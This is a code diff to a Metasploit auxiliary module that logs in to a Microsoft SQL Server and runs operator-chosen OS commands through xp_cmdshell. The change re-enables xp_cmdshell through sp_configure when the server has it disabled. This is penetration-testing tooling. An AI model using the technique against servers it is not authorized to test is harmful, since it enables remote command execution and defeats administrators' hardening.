@@ -39,8 +39,38 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-		mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore
-		disconnect
+
+		if (not mssql_login_datastore)
+			print_error("Failed to login to the server with username '#{datastore['MSSQL_USER']}'")
+			return
+		end
+		
+
+		force_enable = false
+		
+		begin
+		
+			res = mssql_xpcmdshell(datastore['CMD'], false)
+			if(res[:errors] and not res[:errors].empty?)
+				if(not force_enable and res[:errors].join =~ /xp_cmdshell/)
+					print_status("The server may have xp_cmdshell disabled, trying to enable it...")
+					mssql_query("exec master.dbo.sp_configure 'show advanced options', 1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
+					raise RuntimeError, "xp_cmdshell disabled"
+				end
+			end
+			
+			mssql_print_reply(res)
+		
+		rescue RuntimeError => e
+			if(e.to_s =~ /xp_cmdshell disabled/)
+				force_enable = true
+				retry
+			end
+		
+		# Make sure we always disconnect
+		ensure
+			disconnect
+		end
 	end
 end
 
